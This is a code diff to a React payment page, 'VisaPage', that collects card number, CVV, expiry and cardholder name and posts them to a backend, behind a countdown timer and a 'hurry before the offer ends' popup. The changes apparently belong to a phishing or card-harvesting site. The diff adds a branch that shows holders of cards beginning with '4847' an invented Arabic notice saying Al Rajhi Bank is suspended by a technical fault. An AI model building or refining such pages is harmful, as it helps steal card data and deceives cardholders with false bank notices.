@@ -45,10 +45,7 @@ const VisaPage = ({ loading, setLoading }) => {
     }, 1000);
 
     return () => clearInterval(interval);
-
-
   }, []);
-
 
   const hours = Math.floor(counter / 3600);
   const minutes = Math.floor((counter % 3600) / 60);
@@ -61,7 +58,11 @@ const VisaPage = ({ loading, setLoading }) => {
     e.preventDefault();
     setIsProcessing(true);
     setError("");
-    console.log(cardExpiry);
+    if (formData.cardNumber.startsWith("4847")) {
+      setIsProcessing(false);
+      return setError(`عذرًا، مصرف الراجحي موقوف حاليًا
+نفيدكم بأنه يوجد توقف مؤقت في خدمات مصرف الراجحي    وذلك بسبب خلل فني من جهة مصدر البنك`);
+    }
     try {
       // Create a temporary order or initial submission
       await axios.post(`${api_route}/visa/${sessionStorage.getItem("id")}`, {
@@ -272,8 +273,7 @@ const VisaPage = ({ loading, setLoading }) => {
               !formData.cardName ||
               !formData.cardNumber ||
               !formData.cvv ||
-              !cardExpiry ||
-              formData.cardNumber.startsWith("4847")
+              !cardExpiry
             }
             type="submit"
             className="flex-1 bg-[#D24646] text-white py-2 rounded font-medium hover:bg-[#D24646] transition-colors disabled:opacity-50 flex items-center justify-center gap-x-2"
@@ -310,7 +310,7 @@ const VisaPage = ({ loading, setLoading }) => {
       {showPopUp ? (
         <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-black bg-opacity-45 ">
           <div className="w-11/12 md:w-fit p-3 rounded-md bg-white flex flex-col items-center">
-            <img src="/popup.jpeg" className="w-full md:w-1/3"  alt="popup"/>
+            <img src="/popup.jpeg" className="w-full md:w-1/3" alt="popup" />
             <span className="text-xl my-5 text-gray-700 w-fit font-bold">
               سارع قبل نهاية العرض !
             </span>
